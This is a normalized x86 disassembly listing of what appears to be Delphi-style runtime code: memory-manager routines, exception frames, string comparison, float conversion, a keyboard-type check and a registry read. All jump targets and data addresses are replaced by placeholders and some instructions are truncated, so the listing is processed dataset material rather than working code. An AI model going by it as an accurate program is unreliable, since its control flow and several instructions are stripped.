add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d30
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c44
sub [ edi + 0x4 ] 0x4
sub_401f78
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017cc
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401eec
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401fa4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_40185c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401eec
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401fd8
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_402004
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401bb0
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e18
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f78
test al al
jne r-xdata
mov eax esi
call sub_401fd8
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_4020f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401a0c
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402274
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401368
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_402004
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401370
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_4039a0
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_4039a0
jmp r-xdata
sub_402288
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_40241a
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a0c
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401368
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401370
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_4039a0
jmp r-xdata
call sub_401ea0
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401bb0
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e18
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401bb0
sub_40242c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401ea0
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401bb0
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401fa4
test al al
je r-xdata
call sub_401bb0
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c74
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e18
jmp r-xdata
sub_402608
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026b9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a0c
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_40242c
test al al
je r-xdata
push rw-data
call sub_401368
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_4020f8
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028c8
mov eax ebx
call sub_402288
retn
push rw-data
call sub_401370
sub_4026cc
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402828
sub_4026ec
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402828
sub_40270c
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402828
mov [ ecx ] eax
mov al 0x2
jmp sub_402828
retn
mov [ ecx ] eax
retn
sub_40279c
push ebx
push esi
call sub_405ee4
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405ee4
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405ee4
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027dc
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405ee4
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027d0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402864
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028c8
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_402938
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_402978
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402854
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_4029cc
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402854
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402854
jmp r-xdata
sub_402a24
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028c8
pop ebx
retn
mov ecx ebx
sub_402a40
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402ac4
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402b34
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402b54
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402c34
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402c74
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402d27 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402d27 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402d27
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_402f60
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_402f90
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012c4
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_403001
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012bc
retn
sub_40308c
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_403134
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_40318c
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_404920
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_4031ac
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_4057cc
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_4031dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_403260
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_403270
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403267
lea eax [ ebp - 0x8 ]
call sub_4057b4
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_4031ac
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4057cc
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_403270
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_4032b4
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_403354
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4032f4
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_403324
push eax
push ecx
mov eax [ eax ]
call sub_4032f4
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403eac
call [ rw-data ]
sub_40333c
push esi
mov esi edx
mov eax [ eax ]
call sub_4032f4
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403eac
call [ rw-data ]
sub_403384
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_4032f4
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_4033ac
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_4033fc
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
xor ecx ecx
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov cx [ esi ]
add esi 0x2
mov eax [ eax ]
mov [ edi ] al
jmp r-xdata
add esi 0x6
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
mov bx [ esi ]
add esi ebx
dec ecx
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edx [ esi + 0x2 ]
je r-xdata
sub_40343c
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
